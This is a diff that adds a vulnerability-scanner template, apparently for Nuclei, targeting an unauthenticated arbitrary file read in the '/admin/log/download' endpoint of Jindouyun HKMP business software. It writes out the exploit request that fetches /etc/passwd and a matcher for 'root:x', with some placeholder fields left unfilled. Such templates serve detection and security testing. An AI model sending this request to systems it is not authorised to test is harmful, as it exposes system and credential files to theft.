@@ -1,0 +1,18 @@
+id: jindouyun-download-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 金斗云-HKMP智慧商业软件download任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://github.com/wy876/POC/commit/83e10239b38217f344aacc70d4aa47d8f16d0076
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/log/download?file=/etc/passwd"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
